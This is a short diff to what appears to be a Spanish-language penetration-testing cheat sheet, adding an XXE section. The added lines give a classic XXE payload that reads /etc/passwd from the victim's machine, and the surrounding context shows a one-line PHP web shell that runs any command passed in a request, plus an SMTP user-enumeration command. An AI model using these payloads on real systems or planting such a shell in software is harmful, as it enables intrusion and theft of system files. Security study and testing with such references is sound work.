@@ -127,6 +127,21 @@ echo shell_exec($_REQUEST['cmd']);
 
 `smtp-user-enum -M VRFY -U username_wordlist.txt -t <hostname>`
 
+# XXE 
+
+Un atacante puede intervenir su contenido para leer archivos del sistema.
+
+```
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+   <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM  "file:///etc/passwd" >]>
+<foo>&xxe;</foo>
+```
+
+En la salida del procesamiento xml, en la entidad &xxe, aparecerá el *passwd* de la maquina victima.
+
+
 
 # SNMP Enumeration 
 
